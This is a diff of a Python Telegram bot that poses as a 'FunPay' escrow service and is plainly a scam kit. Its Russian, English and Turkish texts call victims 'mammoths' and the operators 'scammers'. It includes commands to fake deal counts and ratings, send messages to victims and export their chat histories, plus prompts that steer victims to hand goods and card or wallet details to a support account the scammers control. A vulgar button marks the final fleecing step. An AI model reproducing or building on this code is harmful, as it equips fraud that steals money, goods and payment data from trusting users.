@@ -1,751 +1,135 @@
-import os
-from dotenv import load_dotenv
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from config import SUPPORT_USERNAME
 
-load_dotenv()
+ICON_DEAL = "5980871942570251958"
+ICON_PROFILE = "5258011929993026890"
+ICON_WITHDRAW = "5310191758255099001"
+ICON_CARD = "5445353829304387411"
+ICON_GROUP = "5237699328843200968"
+ICON_GLOBE = "5332724926216428039"
+ICON_CHAT = "5447410659077661506"
+ICON_SETTINGS = "5841693351249710667"
+ICON_CHART = "5956166805352356645"
+ICON_LIST = "5361692603727252420"
+ICON_USERS = "5258011929993026890"
+ICON_BACK = "5958361550820480866"
+ICON_GRAM = "5980783470538921933"
+ICON_STARS = "5981137191160518179"
+ICON_CROSS = "5210952531676504517"
+ICON_SHARE = "5311998535032409760"
+ICON_HAMMER = "5935968647901089910"
+ICON_CHECK = "5206607081334906820"
+ICON_RUB = "5310191758255099001"
+ICON_RU = "5291734595862018096"
+ICON_US = "5294447773947543583"
+ICON_TR = "5292218402453075461"
+ICON_AR = "5292186580770572877"
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
+def main_menu(is_admin=False):
+    kb = [
+        [InlineKeyboardButton(text="Создать сделку", callback_data="create_deal", icon_custom_emoji_id=ICON_DEAL)],
+        [InlineKeyboardButton(text="Профиль", callback_data="profile", icon_custom_emoji_id=ICON_PROFILE)],
+        [
+            InlineKeyboardButton(text="Вывод", callback_data="withdraw", icon_custom_emoji_id=ICON_WITHDRAW),
+            InlineKeyboardButton(text="Реквизиты", callback_data="requisites", icon_custom_emoji_id=ICON_CARD)
+        ],
+        [
+            InlineKeyboardButton(text="Рефералы", callback_data="referrals", icon_custom_emoji_id=ICON_GROUP),
+            InlineKeyboardButton(text="Язык", callback_data="language", icon_custom_emoji_id=ICON_GLOBE)
+        ],
+        [InlineKeyboardButton(text="Поддержка", url=f"https://t.me/{SUPPORT_USERNAME.replace('@', '')}", icon_custom_emoji_id=ICON_CHAT)],
+    ]
+    if is_admin:
+        kb.insert(0, [InlineKeyboardButton(text="Админ-панель", callback_data="admin_panel", icon_custom_emoji_id=ICON_SETTINGS)])
+    return InlineKeyboardMarkup(inline_keyboard=kb)
 
-ADMIN_IDS = [8187269902]
-SCAMMER_ID = 8187269902
-SCAMMER_USERNAME = "@katusha2009"
-SUPPORT_USERNAME = "@helper_fp"
-COMMISSION = 3.0
-WELCOME_GIF_PATH = "gifs/welcome.gif.mp4"
+def admin_panel():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Статистика", callback_data="admin_stats", icon_custom_emoji_id=ICON_CHART)],
+        [InlineKeyboardButton(text="Все сделки", callback_data="admin_deals", icon_custom_emoji_id=ICON_LIST)],
+        [InlineKeyboardButton(text="Все юзеры", callback_data="admin_users", icon_custom_emoji_id=ICON_USERS)],
+        [InlineKeyboardButton(text="Назад в меню", callback_data="back_to_main", icon_custom_emoji_id=ICON_BACK)]
+    ])
 
-# ========== ЭМОДЗИ ==========
-E_BANK = '<tg-emoji emoji-id="5224607267797606837">🏦</tg-emoji>'
-E_DEAL = '<tg-emoji emoji-id="5980871942570251958">💎</tg-emoji>'
-E_GRAM = '<tg-emoji emoji-id="5980783470538921933">🪙</tg-emoji>'
-E_STARS = '<tg-emoji emoji-id="5981137191160518179">⭐</tg-emoji>'
-E_RUB = '₽'
-E_HAMMER = '<tg-emoji emoji-id="5935968647901089910">🔨</tg-emoji>'
-E_CHECK = '<tg-emoji emoji-id="5206607081334906820">✅</tg-emoji>'
-E_CROSS = '<tg-emoji emoji-id="5210952531676504517">❌</tg-emoji>'
-E_BACK = '<tg-emoji emoji-id="5958361550820480866">⬅️</tg-emoji>'
-E_SHARE = '<tg-emoji emoji-id="5311998535032409760">📤</tg-emoji>'
-E_CHART = '<tg-emoji emoji-id="5956166805352356645">📊</tg-emoji>'
-E_LIST = '<tg-emoji emoji-id="5361692603727252420">📋</tg-emoji>'
-E_USERS = '<tg-emoji emoji-id="5258011929993026890">👥</tg-emoji>'
-E_SETTINGS = '<tg-emoji emoji-id="5841693351249710667">⚙️</tg-emoji>'
-E_PAID = '<tg-emoji emoji-id="5841243255856960314">💜</tg-emoji>'
-E_WARNING = '<tg-emoji emoji-id="5447644880824181073">❗️</tg-emoji>'
-E_PROFILE = '<tg-emoji emoji-id="5258011929993026890">👤</tg-emoji>'
-E_WITHDRAW = '<tg-emoji emoji-id="5310191758255099001">💰</tg-emoji>'
-E_CARD = '<tg-emoji emoji-id="5445353829304387411">💳</tg-emoji>'
-E_GLOBE = '<tg-emoji emoji-id="5332724926216428039">🌐</tg-emoji>'
-E_CHAT = '<tg-emoji emoji-id="5447410659077661506">💬</tg-emoji>'
-E_SUCCESS = '<tg-emoji emoji-id="5373174941095050893">✅</tg-emoji>'
-E_GROUP = '<tg-emoji emoji-id="5237699328843200968">👥</tg-emoji>'
-E_UP = '<tg-emoji emoji-id="5445355530111437729">👆</tg-emoji>'
-E_DOWN = '<tg-emoji emoji-id="5443127283898405358">👇</tg-emoji>'
-E_GIFT = '<tg-emoji emoji-id="5981137191160518179">⭐</tg-emoji>'
-E_RU = '<tg-emoji emoji-id="5291734595862018096">🇷🇺</tg-emoji>'
-E_US = '<tg-emoji emoji-id="5294447773947543583">🇺🇸</tg-emoji>'
-E_TR = '<tg-emoji emoji-id="5292218402453075461">🇹🇷</tg-emoji>'
-E_AR = '<tg-emoji emoji-id="5292186580770572877">🇸🇦</tg-emoji>'
-E_UA = '<tg-emoji emoji-id="5291734595862018096">🇺🇦</tg-emoji>'
+def currency_selection():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="GRAM", callback_data="currency_gram", icon_custom_emoji_id=ICON_GRAM)],
+        [InlineKeyboardButton(text="Карта", callback_data="currency_card", icon_custom_emoji_id=ICON_CARD)],
+        [InlineKeyboardButton(text="Звёзды", callback_data="currency_stars", icon_custom_emoji_id=ICON_STARS)],
+        [InlineKeyboardButton(text="Назад", callback_data="back_to_main", icon_custom_emoji_id=ICON_BACK)]
+    ])
 
-ERROR_MESSAGES = {
-    "no_requisites": f"{E_WARNING} <b>У вас ещё не добавлен реквизит!</b>\n\nДобавьте его здесь: Главное меню → Реквизиты → Добавить",
-    "invalid_gram": f"{E_WARNING} <b>Вы указали неверный адрес кошелька!</b>\n\n❗ Формат: откройте кошелёк -> скопируйте точный адрес -> вставьте скопированный текст",
-    "invalid_card": f"{E_WARNING} <b>Неверный формат карты!</b>\n\nВведите 16 цифр",
-    "deal_not_found": f"{E_CROSS} <b>Сделка не найдена.</b>",
-    "deal_already_paid": f"{E_CROSS} <b>Эта сделка уже оплачена или завершена.</b>",
-    "deal_not_joined": f"{E_CROSS} <b>Мамонт ещё не присоединился к сделке.</b>",
-    "access_denied": f"{E_CROSS} <b>Доступ запрещён.</b>",
-    "invalid_amount": f"{E_CROSS} <b>Введите корректное число</b>",
-    "description_too_long": f"{E_CROSS} <b>Описание слишком длинное (макс 200 символов)</b>"
-}
+def requisite_menu():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Добавить кошелёк", callback_data="add_gram", icon_custom_emoji_id=ICON_GRAM)],
+        [InlineKeyboardButton(text="Добавить карту", callback_data="add_card", icon_custom_emoji_id=ICON_CARD)],
+        [InlineKeyboardButton(text="Удалить все", callback_data="delete_requisites", icon_custom_emoji_id=ICON_CROSS)],
+        [InlineKeyboardButton(text="Назад", callback_data="back_to_main", icon_custom_emoji_id=ICON_BACK)]
+    ])
 
-SCAMMER_STATS = {
-    "8187269902": {"deals": 64, "rating": 5.0},
-    "8844754156": {"deals": 64, "rating": 5.0},
-}
+def deal_actions(deal_code):
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Поделиться ссылкой", callback_data=f"share_{deal_code}", icon_custom_emoji_id=ICON_SHARE)],
+        [InlineKeyboardButton(text="Отмена", callback_data=f"cancel_deal_{deal_code}", icon_custom_emoji_id=ICON_CROSS)]
+    ])
 
-def load_admins_from_file():
-    admins = []
-    try:
-        with open("admins.txt", "r", encoding="utf-8") as f:
-            for line in f:
-                line = line.strip()
-                if line and not line.startswith("#"):
-                    try:
-                        admins.append(int(line))
-                    except:
-                        pass
-        print(f"✅ Загружено скамеров из admins.txt: {len(admins)}")
-    except FileNotFoundError:
-        print("⚠️ Файл admins.txt не найден, создаю новый...")
-        with open("admins.txt", "w", encoding="utf-8") as f:
-            f.write("# Список ID скамеров (без админ-панели)\n")
-            f.write("# Каждый ID на новой строке\n")
-            f.write("8187269902\n")
-            f.write("8844754156\n")
-        admins = [8187269902, 8844754156]
-    return admins
+def deal_status_buttons(deal_code, is_seller=False, is_scammer=False):
+    kb = []
+    if is_seller:
+        kb.append([InlineKeyboardButton(
+            text="Подтвердить передачу", 
+            callback_data=f"confirm_deal_{deal_code}", 
+            icon_custom_emoji_id=ICON_CHECK
+        )])
+    if is_scammer:
+        clean_code = deal_code.strip()
+        kb.append([InlineKeyboardButton(
+            text="Подтвердить получение", 
+            callback_data=f"confirm_deal_scammer_{clean_code}", 
+            icon_custom_emoji_id=ICON_CHECK
+        )])
+    kb.append([InlineKeyboardButton(
+        text="Поддержка", 
+        url=f"https://t.me/{SUPPORT_USERNAME.replace('@', '')}", 
+        icon_custom_emoji_id=ICON_CHAT
+    )])
+    return InlineKeyboardMarkup(inline_keyboard=kb)
 
-SCAMMER_IDS = load_admins_from_file()
-print(f"📋 SCAMMER_IDS: {SCAMMER_IDS}")
+def deal_paid_buttons(deal_code):
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Трахнуть мамонта", callback_data=f"hit_mammoth_{deal_code}", icon_custom_emoji_id=ICON_HAMMER)],
+        [InlineKeyboardButton(text="Поддержка", url=f"https://t.me/{SUPPORT_USERNAME.replace('@', '')}", icon_custom_emoji_id=ICON_CHAT)]
+    ])
 
-# ========== ВСЕ ПЕРЕВОДЫ ==========
-TEXTS = {
-    "ru": {
-        "welcome": "Добро пожаловать в FunPay!",
-        "select_language": "Выберите язык:",
-        "language_set": "✅ Язык установлен: Русский",
-        "main_menu": "Главное меню",
-        "create_deal": "Создать сделку",
-        "profile": "Профиль",
-        "withdraw": "Вывод",
-        "requisites": "Реквизиты",
-        "referrals": "Рефералы",
-        "language": "Язык",
-        "support": "Поддержка",
-        "admin_panel": "Админ-панель",
-        "back": "Назад",
-        "ok": "OK",
-        "access_denied": "❌ Доступ запрещён.",
-        "deal_not_found": "❌ Сделка не найдена.",
-        "deal_already_paid": "❌ Эта сделка уже оплачена или завершена.",
-        "deal_not_joined": "❌ Мамонт ещё не присоединился к сделке.",
-        "invalid_amount": "❌ Введите корректное число",
-        "description_too_long": "❌ Описание слишком длинное (макс 200 символов)",
-        "no_requisites": "❌ У вас ещё не добавлен реквизит!\n\nДобавьте его здесь: Главное меню → Реквизиты → Добавить",
-        "invalid_gram": "❌ Вы указали неверный адрес кошелька!\n\n❗ Формат: откройте кошелёк -> скопируйте точный адрес -> вставьте скопированный текст",
-        "invalid_card": "❌ Неверный формат карты!\n\nВведите 16 цифр",
-        "enter_card": "Введите номер карты:",
-        "deal_created": "✅ Сделка создана!",
-        "deal_code": "Номер сделки",
-        "amount": "Сумма",
-        "description": "Описание",
-        "commission": "Комиссия",
-        "status": "Статус",
-        "completed": "СДЕЛКА УСПЕШНО ЗАВЕРШЕНА",
-        "wait_for_goods": "Пожалуйста, дождитесь поступления товара на ваш аккаунт!",
-        "wait_for_payment": "Ожидайте поступления оплаты на указанный вами ранее кошелёк!",
-        "choose_currency": "Выберите валюту сделки:",
-        "enter_amount": "Введите сумму сделки:",
-        "enter_description": "Что вы предлагаете за {amount} {currency}?",
-        "share_link": "Ссылка для покупателя:",
-        "send_link": "По этой ссылке можно перейти на сделку со мной 🤝",
-        "deal_cancelled": "Сделка отменена",
-        "payment_received": "Оплата по сделке успешно получена!",
-        "seller_notified": "Продавец получил уведомление",
-        "deal_paid_status": "Статус сделки: покупатель успешно оплатил",
-        "wait_seller_transfer": "Дождитесь, пока продавец передаст товар на аккаунт {support}, а затем подтвердите это в боте!",
-        "transfer_only_to": "ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО",
-        "or_no_payment": "В противном случае покупатель не сможет подтвердить получение товара, а вы не сможете получить оплату.",
-        "recommend_screen_record": "Рекомендуем записывать экран во время передачи товара, чтобы поддержка могла лучше разобраться в ситуации при необходимости.",
-        "seller_confirmed": "Статус сделки: покупатель успешно оплатил, продавец подтвердил передачу товара",
-        "wait_scammer_confirm": "Ожидайте проверки покупателем и подтверждения перевода на аккаунт {support}.",
-        "if_not_transferred": "Если товар не был передан на {support}, покупатель не сможет подтвердить получение, а вы не получите оплату!",
-        "scammer_check": "Проверьте передачу товара на {support} и подтвердите это в системе бота.",
-        "after_confirm_payment": "После подтверждения оплата будет безвозвратно отправлена продавцу, а товар — отправлен вам!",
-        "confirm_transfer": "Подтвердить передачу",
-        "confirm_receipt": "Подтвердить получение",
-        "hit_mammoth": "Трахнуть мамонта",
-        "stats": "Статистика",
-        "all_deals": "Все сделки",
-        "all_users": "Все юзеры",
-        "total_users": "Всего пользователей",
-        "total_deals": "Всего сделок",
-        "statuses": "Статусы",
-        "last_10_deals": "Последние 10 сделок",
-        "last_10_users": "Последние 10 пользователей",
-        "no_deals": "Нет сделок",
-        "no_users": "Нет пользователей",
-        "profile_title": "Профиль",
-        "id": "ID",
-        "username": "Юзернейм",
-        "name": "Имя",
-        "successful_deals": "Успешных сделок",
-        "rating": "Рейтинг",
-        "balance": "Баланс",
-        "total_deals_count": "Всего сделок",
-        "completed_deals": "Завершено",
-        "withdraw_title": "Вывод средств",
-        "min_withdraw": "Минимальная сумма для вывода: 1000 RUB",
-        "your_balance": "Ваш баланс",
-        "your_requisites": "Ваши реквизиты для вывода",
-        "withdraw_request_sent": "Заявка на вывод отправлена! Ожидайте обработки.",
-        "no_requisites_withdraw": "У вас нет реквизитов для вывода!\n\nДобавьте реквизиты в меню 'Реквизиты'",
-        "referrals_title": "Реферальная система",
-        "referrals_text": "Приглашайте друзей и получайте бонусы!\nВаша реферальная ссылка:",
-        "referrals_bonus": "За каждого приглашённого друга вы получаете 5% от его сделок!",
-        "language_title": "🌍 Выберите язык / Select language / Dil seçin / اختر اللغة / Оберіть мову:",
-        "admin_welcome": "Приветствую, воркер!",
-        "admin_commands": "Наши команды:",
-        "scammer_welcome": "Приветствую, скамер!",
-        "scammer_commands": "Доступные команды:",
-        "buy_command": "/buy *код-сделки* – для оплаты сделки",
-        "set_sdel": "/set_sdel – для установки успешных сделок",
-        "set_ret": "/set_ret – для установки рейтинга (в профиле)",
-        "twodeal": "/twodeal *юз/айди* – сообщение о второй сделке",
-        "send_command": "/send *текст* *юз/айди* – отправить сообщение",
-        "chat_command": "/chat *юз/айди* – выгрузить историю переписки",
-        "profile_command": "/profile – просмотр профиля",
-        "balance_command": "/balance – баланс",
-        "withdraw_command": "/withdraw – вывод средств",
-        "apply_stats": "/apply_stats – применить статистику скамеров",
-        "use_buy": "Используйте: /buy #код-сделки",
-        "buy_confirm": "Вы уверены что хотите провести оплату по сделке #{code}?",
-        "mammoth": "Мамонт",
-        "unknown": "Неизвестно",
-        "buyer_profile": "Профиль покупателя:",
-        "your_profile_seller": "Ваш профиль (продавец):",
-        "joined_deal": "присоединился к сделке",
-        "do_not_transfer": "Не передавайте товар на {support}, пока бот не уведомит покупателя об оплате!",
-        "stars_payment": "Оплата через поддержку:\nНажмите кнопку «Саппорт» ниже — оператор подскажет, как оплатить звёздами.\n\n👉 {scammer}\n\nПосле успешной оплаты статус сделки изменится, и продавец получит уведомление о вашей успешной оплате!",
-        "requisites_for_payment": "Реквизиты для оплаты:",
-        "after_payment": "После успешной оплаты статус сделки изменится, и продавец получит уведомление о вашей успешной оплате!",
-        "deal_already_processing": "❌ Сделка уже в обработке!",
-        "transfer_already_confirmed": "❌ Передача уже подтверждена!",
-        "deal_already_completed": "❌ Уже завершена!",
-        "deal_not_found_alert": "❌ Сделка не найдена! Проверьте код.",
-        "confirm_wait_scammer": "✅ Передача подтверждена! Ожидайте подтверждения от скамера.",
-        "unknown_command": "Неизвестная команда.\nИспользуйте /start для начала работы.",
-        "function_in_development": "Функция в разработке...",
-        "set_sdel_usage": "Используйте: /set_sdel <количество> [юз/айди]",
-        "set_ret_usage": "Используйте: /set_ret <рейтинг> [юз/айди]",
-        "count_must_be_number": "Количество должно быть числом",
-        "rating_must_be_number": "Рейтинг должен быть числом",
-        "rating_range": "Рейтинг должен быть от 0 до 5",
-        "user_not_found": "Пользователь не найден",
-        "invalid_format": "Неверный формат",
-        "set_for": "Установлено {count} успешных сделок для {target}",
-        "set_rating_for": "Установлен рейтинг {rating} для {target}",
-        "added_gram": "Кошелёк GRAM успешно добавлен!",
-        "added_card": "Карта успешно добавлена!",
-        "requisites_deleted": "Все реквизиты удалены!",
-        "stats_applied": "✅ Статистика скамеров применена!",
-    },
-    "en": {
-        "welcome": "Welcome to FunPay!",
-        "select_language": "Select language:",
-        "language_set": "✅ Language set: English",
-        "main_menu": "Main Menu",
-        "create_deal": "Create Deal",
-        "profile": "Profile",
-        "withdraw": "Withdraw",
-        "requisites": "Requisites",
-        "referrals": "Referrals",
-        "language": "Language",
-        "support": "Support",
-        "admin_panel": "Admin Panel",
-        "back": "Back",
-        "ok": "OK",
-        "access_denied": "❌ Access denied.",
-        "deal_not_found": "❌ Deal not found.",
-        "deal_already_paid": "❌ This deal is already paid or completed.",
-        "deal_not_joined": "❌ Mammoth hasn't joined the deal yet.",
-        "invalid_amount": "❌ Enter a valid number",
-        "description_too_long": "❌ Description is too long (max 200 characters)",
-        "no_requisites": "❌ You haven't added requisites yet!\n\nAdd them here: Main Menu → Requisites → Add",
-        "invalid_gram": "❌ Invalid wallet address!\n\n❗ Format: open wallet -> copy exact address -> paste copied text",
-        "invalid_card": "❌ Invalid card format!\n\nEnter 16 digits",
-        "enter_card": "Enter card number:",
-        "deal_created": "✅ Deal created!",
-        "deal_code": "Deal code",
-        "amount": "Amount",
-        "description": "Description",
-        "commission": "Commission",
-        "status": "Status",
-        "completed": "DEAL SUCCESSFULLY COMPLETED",
-        "wait_for_goods": "Please wait for the goods to arrive on your account!",
-        "wait_for_payment": "Wait for the payment to arrive at your specified wallet!",
-        "choose_currency": "Select deal currency:",
-        "enter_amount": "Enter deal amount:",
-        "enter_description": "What do you offer for {amount} {currency}?",
-        "share_link": "Link for buyer:",
-        "send_link": "You can go to deal with me via this link 🤝",
-        "deal_cancelled": "Deal cancelled",
-        "payment_received": "Payment for deal successfully received!",
-        "seller_notified": "Seller has been notified",
-        "deal_paid_status": "Deal status: buyer successfully paid",
-        "wait_seller_transfer": "Wait for the seller to transfer the goods to {support}, then confirm it in the bot!",
-        "transfer_only_to": "TRANSFER GOODS ONLY TO",
-        "or_no_payment": "Otherwise, the buyer will not be able to confirm receipt of goods, and you will not receive payment.",
-        "recommend_screen_record": "We recommend recording the screen during the transfer so support can better understand the situation if needed.",
-        "seller_confirmed": "Deal status: buyer successfully paid, seller confirmed transfer",
-        "wait_scammer_confirm": "Wait for buyer verification and confirmation of transfer to {support}.",
-        "if_not_transferred": "If the goods were not transferred to {support}, the buyer will not be able to confirm receipt, and you will not receive payment!",
-        "scammer_check": "Check the transfer of goods to {support} and confirm it in the bot system.",
-        "after_confirm_payment": "After confirmation, the payment will be irrevocably sent to the seller, and the goods will be sent to you!",
-        "confirm_transfer": "Confirm Transfer",
-        "confirm_receipt": "Confirm Receipt",
-        "hit_mammoth": "Hit Mammoth",
-        "stats": "Statistics",
-        "all_deals": "All Deals",
-        "all_users": "All Users",
-        "total_users": "Total Users",
-        "total_deals": "Total Deals",
-        "statuses": "Statuses",
-        "last_10_deals": "Last 10 deals",
-        "last_10_users": "Last 10 users",
-        "no_deals": "No deals",
-        "no_users": "No users",
-        "profile_title": "Profile",
-        "id": "ID",
-        "username": "Username",
-        "name": "Name",
-        "successful_deals": "Successful deals",
-        "rating": "Rating",
-        "balance": "Balance",
-        "total_deals_count": "Total deals",
-        "completed_deals": "Completed",
-        "withdraw_title": "Withdraw Funds",
-        "min_withdraw": "Minimum withdrawal amount: 1000 RUB",
-        "your_balance": "Your balance",
-        "your_requisites": "Your withdrawal requisites",
-        "withdraw_request_sent": "Withdrawal request sent! Wait for processing.",
-        "no_requisites_withdraw": "You have no requisites for withdrawal!\n\nAdd requisites in the 'Requisites' menu",
-        "referrals_title": "Referral System",
-        "referrals_text": "Invite friends and get bonuses!\nYour referral link:",
-        "referrals_bonus": "You get 5% from each invited friend's deals!",
-        "language_title": "🌍 Select language / Choose language / Dil seçin / اختر اللغة / Оберіть мову:",
-        "admin_welcome": "Welcome, worker!",
-        "admin_commands": "Our commands:",
-        "scammer_welcome": "Welcome, scammer!",
-        "scammer_commands": "Available commands:",
-        "buy_command": "/buy *deal-code* – to pay for deal",
-        "set_sdel": "/set_sdel – to set successful deals",
-        "set_ret": "/set_ret – to set rating (in profile)",
-        "twodeal": "/twodeal *user/id* – message about second deal",
-        "send_command": "/send *text* *user/id* – send message",
-        "chat_command": "/chat *user/id* – upload chat history",
-        "profile_command": "/profile – view profile",
-        "balance_command": "/balance – balance",
-        "withdraw_command": "/withdraw – withdraw funds",
-        "apply_stats": "/apply_stats – apply scammer stats",
-        "use_buy": "Use: /buy #deal-code",
-        "buy_confirm": "Are you sure you want to pay for deal #{code}?",
-        "mammoth": "Mammoth",
-        "unknown": "Unknown",
-        "buyer_profile": "Buyer profile:",
-        "your_profile_seller": "Your profile (seller):",
-        "joined_deal": "joined the deal",
-        "do_not_transfer": "Do not transfer goods to {support} until the bot notifies about payment!",
-        "stars_payment": "Payment via support:\nClick the 'Support' button below — the operator will guide you on how to pay with stars.\n\n👉 {scammer}\n\nAfter successful payment, the deal status will change, and the seller will receive a notification!",
-        "requisites_for_payment": "Requisites for payment:",
-        "after_payment": "After successful payment, the deal status will change, and the seller will receive a notification!",
-        "deal_already_processing": "❌ Deal is already being processed!",
-        "transfer_already_confirmed": "❌ Transfer already confirmed!",
-        "deal_already_completed": "❌ Already completed!",
-        "deal_not_found_alert": "❌ Deal not found! Check the code.",
-        "confirm_wait_scammer": "✅ Transfer confirmed! Wait for scammer confirmation.",
-        "unknown_command": "Unknown command.\nUse /start to start.",
-        "function_in_development": "Function in development...",
-        "set_sdel_usage": "Use: /set_sdel <count> [user/id]",
-        "set_ret_usage": "Use: /set_ret <rating> [user/id]",
-        "count_must_be_number": "Count must be a number",
-        "rating_must_be_number": "Rating must be a number",
-        "rating_range": "Rating must be from 0 to 5",
-        "user_not_found": "User not found",
-        "invalid_format": "Invalid format",
-        "set_for": "Set {count} successful deals for {target}",
-        "set_rating_for": "Set rating {rating} for {target}",
-        "added_gram": "GRAM wallet successfully added!",
-        "added_card": "Card successfully added!",
-        "requisites_deleted": "All requisites deleted!",
-        "stats_applied": "✅ Scammer stats applied!",
-    },
-    "tr": {
-        "welcome": "FunPay'a hoş geldiniz!",
-        "select_language": "Dil seçin:",
-        "language_set": "✅ Dil seçildi: Türkçe",
-        "main_menu": "Ana Menü",
-        "create_deal": "Anlaşma Oluştur",
-        "profile": "Profil",
-        "withdraw": "Para Çek",
-        "requisites": "Requisitler",
-        "referrals": "Referanslar",
-        "language": "Dil",
-        "support": "Destek",
-        "admin_panel": "Admin Paneli",
-        "back": "Geri",
-        "ok": "TAMAM",
-        "access_denied": "❌ Erişim engellendi.",
-        "deal_not_found": "❌ Anlaşma bulunamadı.",
-        "deal_already_paid": "❌ Bu anlaşma zaten ödendi veya tamamlandı.",
-        "deal_not_joined": "❌ Mamut henüz anlaşmaya katılmadı.",
-        "invalid_amount": "❌ Geçerli bir sayı girin",
-        "description_too_long": "❌ Açıklama çok uzun (maks 200 karakter)",
-        "no_requisites": "❌ Henüz requisit eklemediniz!\n\nBuradan ekleyin: Ana Menü → Requisitler → Ekle",
-        "invalid_gram": "❌ Geçersiz cüzdan adresi!\n\n❗ Format: cüzdanı aç -> tam adresi kopyala -> kopyalanan metni yapıştır",
-        "invalid_card": "❌ Geçersiz kart formatı!\n\n16 hane girin",
-        "enter_card": "Kart numarasını girin:",
-        "deal_created": "✅ Anlaşma oluşturuldu!",
-        "deal_code": "Anlaşma kodu",
-        "amount": "Miktar",
-        "description": "Açıklama",
-        "commission": "Komisyon",
-        "status": "Durum",
-        "completed": "ANLAŞMA BAŞARIYLA TAMAMLANDI",
-        "wait_for_goods": "Lütfen ürünün hesabınıza ulaşmasını bekleyin!",
-        "wait_for_payment": "Ödemenin belirttiğiniz cüzdana ulaşmasını bekleyin!",
-        "choose_currency": "Anlaşma para birimini seçin:",
-        "enter_amount": "Anlaşma miktarını girin:",
-        "enter_description": "{amount} {currency} karşılığında ne sunuyorsunuz?",
-        "share_link": "Alıcı için bağlantı:",
-        "send_link": "Bu bağlantı üzerinden benimle anlaşmaya gidebilirsiniz 🤝",
-        "deal_cancelled": "Anlaşma iptal edildi",
-        "payment_received": "Anlaşma ödemesi başarıyla alındı!",
-        "seller_notified": "Satıcı bilgilendirildi",
-        "deal_paid_status": "Anlaşma durumu: alıcı başarıyla ödedi",
-        "wait_seller_transfer": "Satıcının ürünü {support}'a göndermesini bekleyin, ardından botta onaylayın!",
-        "transfer_only_to": "ÜRÜNÜ SADECE ŞUNA GÖNDERİN",
-        "or_no_payment": "Aksi takdirde alıcı ürünü teslim aldığını onaylayamaz ve siz ödemeyi alamazsınız.",
-        "recommend_screen_record": "Gerekirse desteğin durumu daha iyi anlayabilmesi için ekran kaydı yapmanızı öneririz.",
-        "seller_confirmed": "Anlaşma durumu: alıcı başarıyla ödedi, satıcı transferi onayladı",
-        "wait_scammer_confirm": "Alıcı doğrulaması ve {support}'a transfer onayı bekleniyor.",
-        "if_not_transferred": "Ürün {support}'a gönderilmediyse, alıcı teslim almayı onaylayamaz ve siz ödemeyi alamazsınız!",
-        "scammer_check": "Ürünün {support}'a transferini kontrol edin ve bot sisteminde onaylayın.",
-        "after_confirm_payment": "Onaydan sonra ödeme satıcıya geri dönülemez şekilde gönderilecek ve ürün size gönderilecek!",
-        "confirm_transfer": "Transferi Onayla",
-        "confirm_receipt": "Teslim Almayı Onayla",
-        "hit_mammoth": "Mamutu Vur",
-        "stats": "İstatistikler",
-        "all_deals": "Tüm Anlaşmalar",
-        "all_users": "Tüm Kullanıcılar",
-        "total_users": "Toplam Kullanıcı",
-        "total_deals": "Toplam Anlaşma",
-        "statuses": "Durumlar",
-        "last_10_deals": "Son 10 anlaşma",
-        "last_10_users": "Son 10 kullanıcı",
-        "no_deals": "Anlaşma yok",
-        "no_users": "Kullanıcı yok",
-        "profile_title": "Profil",
-        "id": "ID",
-        "username": "Kullanıcı adı",
-        "name": "İsim",
-        "successful_deals": "Başarılı anlaşmalar",
-        "rating": "Puan",
-        "balance": "Bakiye",
-        "total_deals_count": "Toplam anlaşma",
-        "completed_deals": "Tamamlandı",
-        "withdraw_title": "Para Çekme",
-        "min_withdraw": "Minimum çekim miktarı: 1000 RUB",
-        "your_balance": "Bakiyeniz",
-        "your_requisites": "Çekim requisitleriniz",
-        "withdraw_request_sent": "Çekim talebi gönderildi! İşleme alınmasını bekleyin.",
-        "no_requisites_withdraw": "Çekim için requisitleriniz yok!\n\n'Requisitler' menüsünden ekleyin",
-        "referrals_title": "Referans Sistemi",
-        "referrals_text": "Arkadaşlarını davet et ve bonus kazan!\nReferans bağlantın:",
-        "referrals_bonus": "Davet ettiğin her arkadaşın anlaşmalarından %5 kazanırsın!",
-        "language_title": "🌍 Dil seçin / Choose language / Select language / اختر اللغة / Оберіть мову:",
-        "admin_welcome": "Hoş geldin, işçi!",
-        "admin_commands": "Komutlarımız:",
-        "scammer_welcome": "Hoş geldin, dolandırıcı!",
-        "scammer_commands": "Mevcut komutlar:",
-        "buy_command": "/buy *anlaşma-kodu* – anlaşmayı ödemek için",
-        "set_sdel": "/set_sdel – başarılı anlaşmaları ayarlamak için",
-        "set_ret": "/set_ret – puan ayarlamak için (profilde)",
-        "twodeal": "/twodeal *kullanıcı/id* – ikinci anlaşma mesajı",
-        "send_command": "/send *metin* *kullanıcı/id* – mesaj gönder",
-        "chat_command": "/chat *kullanıcı/id* – sohbet geçmişini yükle",
-        "profile_command": "/profile – profili görüntüle",
-        "balance_command": "/balance – bakiye",
-        "withdraw_command": "/withdraw – para çek",
-        "apply_stats": "/apply_stats – dolandırıcı istatistiklerini uygula",
-        "use_buy": "Kullanım: /buy #anlaşma-kodu",
-        "buy_confirm": "#{code} anlaşmasını ödemek istediğinize emin misiniz?",
-        "mammoth": "Mamut",
-        "unknown": "Bilinmiyor",
-        "buyer_profile": "Alıcı profili:",
-        "your_profile_seller": "Profiliniz (satıcı):",
-        "joined_deal": "anlaşmaya katıldı",
-        "do_not_transfer": "Bot ödeme bildirimi yapana kadar ürünü {support}'a göndermeyin!",
-        "stars_payment": "Destek üzerinden ödeme:\nAşağıdaki 'Destek' butonuna tıklayın — operatör yıldızlarla nasıl ödeyeceğinizi anlatacaktır.\n\n👉 {scammer}\n\nBaşarılı ödemeden sonra anlaşma durumu değişecek ve satıcıya bildirim gönderilecek!",
-        "requisites_for_payment": "Ödeme için requisitler:",
-        "after_payment": "Başarılı ödemeden sonra anlaşma durumu değişecek ve satıcıya bildirim gönderilecek!",
-        "deal_already_processing": "❌ Anlaşma zaten işleniyor!",
-        "transfer_already_confirmed": "❌ Transfer zaten onaylandı!",
-        "deal_already_completed": "❌ Zaten tamamlandı!",
-        "deal_not_found_alert": "❌ Anlaşma bulunamadı! Kodu kontrol edin.",
